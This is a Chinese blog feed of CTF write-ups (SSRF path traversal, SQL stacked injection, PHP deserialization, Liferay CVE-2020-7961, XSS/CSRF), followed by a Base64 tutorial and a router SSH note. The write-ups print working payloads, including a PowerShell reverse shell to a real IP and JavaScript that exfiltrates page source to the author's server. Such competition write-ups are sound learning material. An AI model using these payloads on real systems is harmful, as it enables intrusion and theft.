$ip=$ciparr[0].&#39;.&#39;.$ciparr[1].&#39;.&#39;.$ciparr[2].&#39;.&#39;.$ciparr[3];
echo &#39;&lt;br/&gt;Scanning IP &#39;.$ip.&#39;&lt;br/&gt;&#39;;
@ob_flush();
@flush();
scanip($ip,$timeout,$portarr);
$ciparr[3]+=1;

if($ciparr[3]&gt;255){
$ciparr[2]+=1;
$ciparr[3]=0;
}
if($ciparr[2]&gt;255){
$ciparr[1]+=1;
$ciparr[2]=0;
}
}
}

/*内网代理代码*/

function getHtmlContext($url){ 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_HEADER, TRUE);    //表示需要response header 
    curl_setopt($ch, CURLOPT_NOBODY, FALSE); //表示需要response body 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 120); 
    $result = curl_exec($ch); 
  global $header; 
  if($result){ 
       $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE); 
       $header = explode(&quot;\r\n&quot;,substr($result, 0, $headerSize)); 
       $body = substr($result, $headerSize); 
  } 
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;200&#39;) { 
        return $body; 
    } 
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;302&#39;) { 
    $location = getHeader(&quot;Location&quot;); 
    if(strpos(getHeader(&quot;Location&quot;),&#39;http://&#39;) == false){ 
      $location = getHost($url).$location; 
    } 
        return getHtmlContext($location); 
    } 
    return NULL; 
} 

function getHost($url){ 
    preg_match(&quot;/^(http:\/\/)?([^\/]+)/i&quot;,$url, $matches); 
    return $matches[0]; 
} 
function getCss($host,$html){ 
    preg_match_all(&quot;/&lt;link[\s\S]*?href=[&#39;\&quot;](.*?[.]css.*?)[\&quot;&#39;][\s\S]*?&gt;/i&quot;,$html, $matches); 
    foreach($matches[1] as $v){ 
    $cssurl = $v; 
        if(strpos($v,&#39;http://&#39;) == false){ 
      $cssurl = $host.&quot;/&quot;.$v; 
    } 
    $csshtml = &quot;&lt;style&gt;&quot;.file_get_contents($cssurl).&quot;&lt;/style&gt;&quot;; 
    $html .= $csshtml; 
  } 
  return $html; 
} 

if($url != null){ 

    $host = getHost($url); 
    echo getCss($host,getHtmlContext($url)); 
}
?&gt;</code></pre>
<p>发现除了代码功能还存在SSRF。通过GET传参，可以调用<code>getHtmlContext()</code>获取页面源码，而<code>getCss()</code>能够获取页面的CSS。<code>getHtmlContext()</code>虽然能够通过<code>file:\\</code>协议读取flag，但是返回的code必须是200才有可能返回内容，如果是这里getflag的话必须要让code为200，暂时不知道有没有方法，暂时放一边。</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-194621@2x.png" alt="WX20201223-194621@2x"></p>
<p>第二个就是<code>getCss()</code>中的<code>file_get_contents()</code>,其中的参数<code>「$cssurl」</code>来源于<code>getHtmlContext()</code>读取远程页面内容中匹配到的<code>&lt;link&gt;</code>标签中的<code>href</code>.那么我们是否能够控制远程页面中的<code>&lt;link&gt;</code>标签中的<code>href</code>为flag地址，从而读取到flag呢？</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195012@2x.png" alt="WX20201223-195012@2x"></p>
<p>但是这个正则表达式需要匹配css文件，但是这歌正则只需要含有<code>.css</code>这个关键字即可。</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195239@2x.png" alt="WX20201223-195239@2x"></p>
<p>但是代码中需要含有<code>http://</code>否则会自动拼接一个<code>http://host</code></p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-195416@2x.png" alt="WX20201223-195416@2x"></p>
<p>我们知道<code>file_get_contents</code>这个函数在遇到不认识的协议头会造成目录穿越问题。同时<code>strpos($v,&#39;http://&#39;)</code>只是字符串中是否存在<code>http://</code>而没有写死。我们只需要添加协议头中含有<code>http：//</code>即可。例如：<code>shttp://</code>所以我们构造如下payload即可：</p>
<pre><code class="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot;  href=&quot;shttp:///../../../../../../../../../etc/password/.css/../../../../../../etc/passwd&quot; /&gt;</code></pre>
<p>将上面payload保存的自己的服务器，再提交给靶机即可直接读取到/etc/passwd</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200254@2x.png" alt="WX20201223-200254@2x"></p>
<p>修改一下读取flag。</p>
<p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200056@2x.png" alt="WX20201223-200056@2x"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dozer 2020 CTF部分Write up</title>
    <url>//articles/d026958343.html</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h3><ul>
<li>一开始也不知道咋做后面看了Hint提示url二次编码。发现单引号是url二次编码绕过。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200614220108.png" alt="20200614220108"></p>
<ul>
<li>但是一些关键字如select、union等被过滤了。尝试内联注释、注释、&lt;&gt;等绕过方法无果。后尝试堆叠注入发现成功。</li>
</ul>
<pre><code class="http">http://118.31.11.216:30501/?id=1%2527;show%20tables;--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200614220443.png" alt="20200614220443"></p>
<ul>
<li>想起了令人深刻的强网杯随便注。老套路查字段。</li>
</ul>
<pre><code class="http">http://118.31.11.216:30501/?id=1%2527;show%20columns%20from%20uziuzi;--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200614220846.png" alt="20200614220846"></p>
<ul>
<li>预处理查询数据库内容，这里卡了一会，直接拼接字符串没法执行，所以把字符串转16进制再执行，还有prepare、set这里做了过滤和强网杯一样，利用大小写不敏感直接绕过,直接得到flag.</li>
</ul>
<pre><code class="http">http://118.31.11.216:30501/?id=0%2527%20;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;Prepare%20stmt%20from%20@sql;EXECUTE%20stmt;--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200614221253.png" alt="20200614221253"></p>
<h3 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a>白给的反序列化</h3><ul>
<li>一开始没看题，一直去读<code>/flag</code>导致卡了一下,没啥绕过的，主要要改写一下payload，由于使用<code>private</code>，会导致生成的payload有&lt;0x00&gt;所以需要绕过一下，而且服务器的php版本是php5.59，没法直接改成public绕过，所以需要吧s改成S（这样能识别16进制的<code>%00</code>）,把&lt;0x00&gt;替换为<code>\00</code>.</li>
</ul>
<pre><code>http://118.31.11.216:30600/?path=O:4:%22home%22:2:{S:12:%22\00home\00method%22;s:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:{i:0;s:8:%22flag.php%22;}}</code></pre><ul>
<li>EXP</li>
</ul>
<pre><code class="php"> &lt;?php

class home
{
    private $method;
    private $args;
    function __construct($method, $args)
    {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }

}

$o = new home(&quot;mysys&quot;,[&#39;flag.php&#39;]);
echo serialize($o);
?&gt;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200614222456.png" alt="20200614222456"></p>
<h3 id="简单域渗透-flag1"><a href="#简单域渗透-flag1" class="headerlink" title="简单域渗透-flag1"></a>简单域渗透-flag1</h3><ul>
<li><p>这道题抢了2血，看到界面就知道了是最近的<strong>CVE-2020-7961 Liferay Portal</strong></p>
</li>
<li><p>先搞个EXP,用powershell反弹一个shell到服务器：</p>
</li>
</ul>
<pre><code class="java">public class LifExp {
static {
try {
String[] cmd = {&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;); powercat -c 39.107.126.173 -p 25565 -e cmd&quot;};

java.lang.Runtime.getRuntime().
exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}</code></pre>
<ul>
<li>编译成class放服务器上。</li>
</ul>
<pre><code class="shell">javac .\LifExp.java</code></pre>
<ul>
<li>用marshalsec生成payload</li>
</ul>
<pre><code class="shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://39.107.126.173/ LifExp</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614224615.png" alt="微信截图_20200614224615"></p>
<ul>
<li>发送数据包</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/0200614225038.png" alt="0200614225038"></p>
<ul>
<li>反弹shell后，flag在桌面的flag.txt</li>
</ul>
<h3 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h3><ul>
<li>这道题拿了3血。题目提示是一个前端漏洞，前端漏洞也就csrf、xss了。nc监听，给网站交一个我们的链接看看：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230021.png" alt="微信截图_20200614230021"></p>
<ul>
<li>看到<code>admin_shark.php</code>,不用想了肯定flag就在这个页面了，我们要做的就是把这个页面的源码窃取到。在线上打开这个也印证了这点：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230157.png" alt="微信截图_20200614230157"></p>
<ul>
<li>这里是一个类似phpmyadmin的东西，查询时候能直接打印出字符串，这样我们就能够构造一个xss去窃取<code>admin_shark.php</code> 页面源码，但是<code>sql.php</code> 需要POST提交无法直接提交这个链接给后台管理员，所以需要构造一个自动提交的表单来csrf触发这个xss.思路很简单了。画个图说明一下：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614230931.png" alt="微信截图_20200614230931"></p>
<ul>
<li>这里插入xss到数据库需要注意做了简单的过滤，只需将payload转16进制再<code>unhex</code> 转回来就行了，不过这我是搭了一血的车，我直接把他的xss地址换成我的了：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200614231135.png" alt="微信图片_20200614231135"></p>
<ul>
<li>构造自动查询表单来触发csrf,exp.html</li>
</ul>
<pre><code class="html">&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
    &lt;form name=&quot;exp&quot; action=&quot;http://127.0.0.1/sql.php&quot; method=&quot;POST&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select * from p1g3&quot; /&gt;

    &lt;/form&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
document.exp.submit()
&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>构造获取页面源码的xss</li>
</ul>
<pre><code class="javascript">function createXmlHttp() {
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest()
    } else {
        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);
        for (var n = 0; n &lt; MSXML.length; n++) {
            try {
                xmlHttp = new ActiveXObject(MSXML[n]);
                break
            } catch(e) {}
        }
    }
}
createXmlHttp();
xmlHttp.onreadystatechange = function(){
  if (xmlHttp.readyState == 4) {
        code=escape(xmlHttp.responseText);
        createXmlHttp();
        url = &quot;http://39.107.126.173:8080/re.php&quot;;   //这里是我们服务器接受的地址
        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=index.html&quot;;
        xmlHttp.open(&quot;POST&quot;, url, true);
        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
        xmlHttp.send(cc)
  }
};
xmlHttp.open(&quot;GET&quot;, &quot;/admin_shark.php&quot;, true);//这块填写获得的后台地址。
xmlHttp.setRequestHeader(&quot;Referer&quot;, &quot;http://127.0.0.1/&quot;);
xmlHttp.send(null);</code></pre>
<ul>
<li>接收页面源码的exp：</li>
</ul>
<pre><code class="php">&lt;?php
        function js_unescape($str) {
                $ret = &#39;&#39;;
                $len = strlen($str);
                for ($i = 0;$i &lt; $len;$i++) {
                        if ($str[$i] == &#39;%&#39; &amp;&amp; $str[$i + 1] == &#39;u&#39;) {
                                $val = hexdec(substr($str, $i + 2, 4));
                                if ($val &lt; 0x7f) $ret.= chr($val);
                                else if ($val &lt; 0x800) $ret.= chr(0xc0 | ($val &gt;&gt; 6)) . chr(0x80 | ($val &amp; 0x3f));
                                else $ret.= chr(0xe0 | ($val &gt;&gt; 12)) . chr(0x80 | (($val &gt;&gt; 6) &amp; 0x3f)) . chr(0x80 | ($val &amp; 0x3f));
                                $i+= 5;
                        } else if ($str[$i] == &#39;%&#39;) {
                                $ret.= urldecode(substr($str, $i, 3));
                                $i+= 2;
                        } else $ret.= $str[$i];
                }
                return $ret;
        }
        $data = js_unescape($_POST[&#39;htmlcode&#39;]);  //对获得源码js_unescape解码。
        $filename = $_POST[&#39;filename&#39;] . date(&quot;y-m-d-h-i-s&quot;) . &quot;.html&quot;;
        $myfile = fopen($filename, &quot;w&quot;);
        fwrite($myfile, $data);
        fclose($myfile);
?&gt;</code></pre>
<ul>
<li>这样我们在提交url给后台时候就会自动跳转的sql.php触发xss窃取<code>admin_shark.php</code>的源码,源码会保存在我们的服务器中。<br><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614231648.png" alt="微信截图_20200614231648"></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200614231558.png" alt="微信图片_20200614231558"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a>py吗？</h3><ul>
<li>一张老外穿着python文化衫的图片。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/py.png" alt="py"></p>
<ul>
<li>修一下高度让他恢复正常的crc32校验以便其他软件能够打开：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614231934.png" alt="微信截图_20200614231934"></p>
<ul>
<li>国际惯例：Stegsolve-&gt;Analyse-&gt;Data Extract</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614232301.png" alt="微信截图_20200614232301"></p>
<ul>
<li>发现base64，解码得到flag.</li>
</ul>
<pre><code>Dozerctf{python_is_the_best_language!}</code></pre><h3 id="夏日计划"><a href="#夏日计划" class="headerlink" title="夏日计划"></a>夏日计划</h3><ul>
<li>下载下来按照国际惯例010打开，发现是一个RAR压缩文件</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/QQ%E5%9B%BE%E7%89%8720200614232519.png" alt="QQ图片20200614232519"></p>
<ul>
<li>直接解压会发现少几个文件，所以直接从里面拉出来就行了</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/QQ%E5%9B%BE%E7%89%8720200614232702.png" alt="QQ图片20200614232702"></p>
<ul>
<li>会发现secret.rar是损坏的，所以直接用winrar修复会发现里面有四个文件，里面的内容全是两两相对，非常像坐标。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614232958.png" alt="微信截图_20200614232958"></p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614233025.png" alt="微信截图_20200614233025"></p>
<ul>
<li>而且，这些坐标正好是一个X长度为140，Y的长度为140的平面直角坐标系，一个正方形不用猜都能想到是一个二维之类的的东西了，于是乎kail linux启动用 <code>gnuplot</code>把四个文件合成一个qt.txt，生成一个二维试试看</li>
</ul>
<pre><code class="shell">root@kali:~/桌面# gnuplot

        G N U P L O T
        Version 5.2 patchlevel 8    last modified 2019-12-01 

        Copyright (C) 1986-1993, 1998, 2004, 2007-2019
        Thomas Williams, Colin Kelley and many others

        gnuplot home:     http://www.gnuplot.info
        faq, bugs, etc:   type &quot;help FAQ&quot;
        immediate help:   type &quot;help&quot;  (plot window: hit &#39;h&#39;)

Terminal type is now &#39;qt&#39;
gnuplot&gt; plot &quot;qt.txt&quot;
qt5ct: using qt5ct plugin
gnuplot&gt; 
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614233644.png" alt="微信截图_20200614233644"></p>
<ul>
<li>刚刚在网鼎杯被虐完，怎么可能不知道这是一个汉信码。photoshop,去色，反相，拉曲线，作为一名<code>CTF患者</code>怎么可能不会PS?,于是得到一张汉信码。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/HXcode.gif" alt="HXcode"></p>
<ul>
<li>这里一定要吐槽一下，全网识别这个东西的网站就一个。。。今天它还蹦了，汉信码官网识别不了汉码官网生成的汉信码。我裂开了，最后找出题的师傅提供了<code>解题过程</code>，解决了。。。。万分感谢。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200614234121.png" alt="微信截图_20200614234121"></p>
<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><ul>
<li>填问卷</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>BASE64编码原理学习笔记</title>
    <url>//articles/d37b850031.html</url>
    <content><![CDATA[<h1 id="Base64编码原理解析"><a href="#Base64编码原理解析" class="headerlink" title="Base64编码原理解析"></a>Base64编码原理解析</h1><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符</p>
<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>‘A’ 转变为Base64编码：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190906/15677508068341.png" alt="img"></p>
<h2 id="表格流程"><a href="#表格流程" class="headerlink" title="表格流程"></a>表格流程</h2><table>
<thead>
<tr>
<th>字符</th>
<th>A</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>AIISC码</td>
<td>65</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>二进制</td>
<td>01000001</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>分组</td>
<td>010000</td>
<td>01000000</td>
<td>=</td>
<td>=</td>
</tr>
<tr>
<td>十进制</td>
<td>16</td>
<td>16</td>
<td>=</td>
<td>=</td>
</tr>
<tr>
<td>BASE64</td>
<td>Q</td>
<td>Q</td>
<td>=</td>
<td>=</td>
</tr>
</tbody></table>
<h2 id="BASE64查询表"><a href="#BASE64查询表" class="headerlink" title="BASE64查询表"></a>BASE64查询表</h2><pre><code class="python">[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]</code></pre>
<p>从上方流程可以简单知道BASE64是先转换为AIISC码再转换为二进制进而将8位bit分组为6位bit最后不足补0，如组数不足4组，那么就用等于号（“=”）补充。最后将分组的各组再转换为10进制，按照换回来的数字当做base64编码表的形式进行查表得出结果。例如16就是在上述表中找第17位也就是数组的第16位。</p>
<h2 id="Python实现BASE64编码"><a href="#Python实现BASE64编码" class="headerlink" title="Python实现BASE64编码"></a>Python实现BASE64编码</h2><pre><code class="python">import re
base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;]
def num_10_to_2(numbers):
    result=[]
    tmp=[]
    return_str=&#39;&#39;
    for number in numbers:
        while number/2!=0:
            result.append(int(number%2))
            number=int(number/2)    
        if(len(result)&lt;8):
            for i in range(0,8-len(result)):
                result.append(0)
        number_2=&#39;&#39;
        for i in range(0,len(result)):    
            nums=len(result)-i-1
            number_2=str(result[nums])+number_2
        tmp.append(number_2)
        result=[]
    for i in range(len(tmp)):
        return_str=return_str+tmp[i][::-1]
    return return_str
def num_2_to_10(number):
    number=str(number)
    nums=0
    for i  in number:
        nums=nums*2+int(i)
    return nums            

def str_to_aiisc(str_char):
    tmp=[]
    for i in str_char:
         tmp.append(int(ord(i)))    
    return tmp
def cut_string(strings,lenth):
    result =  re.findall(&#39;.{&#39;+str(lenth)+&#39;}&#39;,strings)
    result.append(strings[(len(result)*lenth):]) #把最后几位加上
    for i in range(0,6-len(result[len(result)-1])):
        result[len(result)-1]=result[len(result)-1]+str(&#39;0&#39;)
    return result
def main(strings):
    group_base = cut_string(num_10_to_2(str_to_aiisc(strings)),6)
    if(group_base[len(group_base)-1])==&#39;000000&#39;:
        group_base.pop(len(group_base)-1)
    #print(group_base)
    for i in group_base:
        print(base64_table[num_2_to_10(i)], end=&#39;&#39;)
    #print(4-int((len(group_base)/4)/0.25)%4)    
    for i in range(4-int((len(group_base)/4)/0.25)%4):
        print(&quot;=&quot;, end=&#39;&#39;)
    print(&#39;\n&#39;)    
if __name__==&#39;__main__&#39;:
    main(&#39;A&#39;)</code></pre>
<h2 id="PHP实现BASE64编码"><a href="#PHP实现BASE64编码" class="headerlink" title="PHP实现BASE64编码"></a>PHP实现BASE64编码</h2><pre><code class="php">&lt;?php
function num_10_to_2($number){
    $result=[];
    $tmp=[];
    $number_2=&#39;&#39;;
    for($i=0;$i&lt;count($number);$i++){
        while ($number[$i]/2!=0) {
        array_push($result,intval($number[$i]%2));
        $number[$i]=intval($number[$i]/2);
        }
        for($j=0;$j&lt;count($result);$j++){
            $nums = count($result)-$j-1;
            $number_2 = strval($result[$nums]).$number_2;
        }
        ///echo $number_2.&#39;&lt;br&gt;&#39;;
        array_push($tmp,$number_2);
        $number_2=&#39;&#39;;
        $result=[];
    }
    //var_dump($tmp);
    for($j=0;$j&lt;count($tmp);$j++){
    if(strlen($tmp[$j])&lt;8){
        for($i=0;$i&lt;8-strlen($tmp[$j]);$i++){
            $tmp[$j]=$tmp[$j].&#39;0&#39;;
        }
        $tmp[$j]=strrev($tmp[$j]);
        //echo $tmp[$j].&#39;&lt;br&gt;&#39;;
    }
    }

```
return implode($tmp);
```

}
function num_2_to_10($number){
    $number = strval($number);
    $nums = 0;
    for($i=0;$i&lt;strlen($number);$i++){
        $nums = $nums*2+intval(substr($number,$i,1));
    }
    return $nums;
}
function str_to_aiisc($str_char){
    $result=[];
    $str_char = strval($str_char);
    for($i=0;$i&lt;strlen($str_char);$i++){
        array_push($result,intval(ord(substr($str_char,$i,1))));
    }
    return $result;
}
function cut_string($number,$lenth){
    $number = strval($number);
    $number =  str_split($number,intval($lenth));
    for($i=0;$i&lt;count($number);$i++){
        if(strlen($number[$i])&lt;6){
            $number[$i]=$number[$i].str_repeat(&#39;0&#39;, 6-strlen($number[$i]));
        }
    }
    return $number;
}
function base64Encode($strings){
    $base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,
                &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,
                &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
                &#39;+&#39;, &#39;/&#39;, &#39;=&#39;];
    $result=&#39;&#39;;
    $group_bas64 = cut_string(num_10_to_2(str_to_aiisc($strings)),6);
    for($i=0;$i&lt;count($group_bas64);$i++){
        $result=$result.$base64_table[num_2_to_10($group_bas64[$i])];
    }
    for($i=0;$i&lt;4-intval((count($group_bas64)/4)/0.25)%4;$i++){
        $result=$result.&quot;=&quot;;
    }
    return $result;
}
 echo base64Encode(&#39;ABaaa&#39;)
?&gt;</code></pre>
]]></content>
      <categories>
        <category>编码学习</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>极路由开启SSH并按照python笔记</title>
    <url>//articles/d386e3624.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>极路由在现在的版本中并不支持telnet连接，在网上还是找到getshell这个路由器的方法。再此复现，并作笔记。</p>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul>
<li><p>路由器需SDcare</p>
</li>
<li><p>安装 <code>定时重拨</code>插件（sid=118284854）</p>
</li>
<li><p>安装<code>vsftpd</code>插件（sid=770934750）</p>
</li>
</ul>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><ul>
<li>将以下脚本保存为<code>test.sh</code>,放置在<code>ftp://hiwifi.com/</code>目录下,该目录是SD卡并被挂载在<code>/tmp/storage</code>下,<code>vsftpd</code>插件定义目录也在<code>/tmp/storage</code>即可</li>
</ul>
<pre><code class="shell">#!/bin/bash

# 启动SSH并设置自动启动
sed -i &#39;s/1022/22/g&#39; /etc/config/dropbear 
/etc/init.d/dropbear enable
/etc/init.d/dropbear start</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/1569562530306.png" alt="img"></p>
<ul>
<li>设置定时重拨规则：<code>* * * * * sh /tmp/storage/test.sh</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695626475301.png" alt="img"></p>
<ul>
<li>启动等待一分钟即可直接ssh连接上路由器账号为<code>root</code>,密码为后台密码。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190927/15695627717019.png" alt="img"></p>
<h4 id="安装python和pip"><a href="#安装python和pip" class="headerlink" title="安装python和pip"></a>安装python和pip</h4><ul>
